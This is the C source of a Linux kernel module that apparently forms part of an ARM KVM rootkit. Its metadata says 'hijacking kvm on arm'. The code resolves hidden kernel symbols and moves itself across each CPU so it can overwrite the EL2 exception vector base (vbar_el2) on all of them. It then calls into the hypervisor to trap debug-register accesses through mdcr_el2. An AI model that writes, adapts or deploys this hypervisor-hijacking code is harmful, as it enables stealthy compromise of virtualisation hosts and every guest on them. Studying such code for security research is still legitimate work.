#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kvm_host.h>
#include <asm/sysreg.h>
#include <linux/smp.h>

#include "include/kvmrk.h"
#include "include/resolve_kallsyms.h"

typedef long (*sched_setaffinity_t)(pid_t pid, const struct cpumask *in_mask);

static sched_setaffinity_t _sched_setaffinity = NULL;

long kvmrk_sched_setaffinity(pid_t pid, const struct cpumask *in_mask) {
    if (!_sched_setaffinity) {
        _sched_setaffinity = rk_kallsyms_lookup_name("sched_setaffinity");
    }

    return _sched_setaffinity(pid, in_mask);
}


extern char kvmrk_vectors[];
extern void hijack_mdcr_el2(void);
extern void kvmrk_replace_vbar_el2(unsigned long new_vbar_el2);
extern void kvmrk_call_hyp(unsigned long func_pa);
extern void kvmrk_crash_everything(void);

extern void kvmrk_set_vectors(phys_addr_t phys_vector_base);
extern int kvmrk_reset_vectors(void);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("hijacking kvm on arm");
MODULE_VERSION("0.01");

static int __init kvmrk_init(void) {
    printk(KERN_INFO "kvmrk: module loaded\n");

    // kvmrk_replace_vbar_el2(virt_to_phys(kvmrk_vectors));

    int i;
    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        int r = kvmrk_reset_vectors();
        printk(KERN_INFO "kvmrk: reset vectors of cpu %i with return code %i\n", smp_processor_id(), r);
    }

    for (i = 0; i < num_online_cpus(); i++) {
        kvmrk_sched_setaffinity(0, get_cpu_mask(i));
        kvmrk_set_vectors(virt_to_phys(kvmrk_vectors));
        printk(KERN_INFO "kvmrk: set vectors of cpu %i\n", smp_processor_id());
    }

    printk(KERN_INFO "kvmrk: replaced vbar_el2 on all cpus\n");

    kvmrk_call_hyp(virt_to_phys(hijack_mdcr_el2));
    printk(KERN_INFO "kvmrk: trapped accesses to debug regs from el1 via mdcr_el2\n");

    // kvmrk_crash_everything();

    return 0;
}

static void __exit kvmrk_exit(void) {
    printk(KERN_INFO "kvmrk: module unloaded\n");
}

module_init(kvmrk_init);
module_exit(kvmrk_exit);
